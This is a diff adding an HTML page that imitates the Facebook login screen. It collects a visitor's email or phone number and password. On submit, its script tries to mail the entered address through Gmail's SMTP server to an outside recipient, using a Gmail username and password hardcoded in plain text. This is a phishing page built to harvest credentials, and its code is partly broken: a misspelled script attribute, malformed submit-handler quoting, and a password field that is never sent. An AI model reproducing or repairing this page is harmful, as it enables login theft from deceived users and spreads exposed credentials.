@@ -1,0 +1,38 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <title>Document</title>
+</head>
+<body>
+    <div class="txt1"><p>Facebook requests and receives your phone number from your mobile net work . <a href="">Change Settings</a></p></div>
+    <h2>facebook</h2>
+    <form action="" onsubmit="sendEmail()" ; reset() ; return false">
+        <input type="text" class="txt" id="email" placeholder="Mobile number or email address">
+        <input type="password" class="pass" placeholder="Password">
+        <input type="submit" class="sub" value="Log In">
+    </form>
+    <a href="">Forgotten password?</a>
+    <p class="or">Or</p>
+    <button class="new">Create New Account</button>
+<script srv=" https://smtpjs.com/v3/smtp.js"></script>
+<script>
+    function sendEmail(){
+    Email.send({
+        Host : "smtp.gmail.com",
+        Username : "pappubro69@gmail.com",
+        Password : "pappubro69420",
+        To : 'mvai23288@gmail.com',
+        From :document.getElementById('email').value,
+    //    Subject : "This is the subject",
+        Body : "And this is the body"
+    }).then(
+      message => alert(message)
+    );
+}
+</script>
+</body>
+</html>
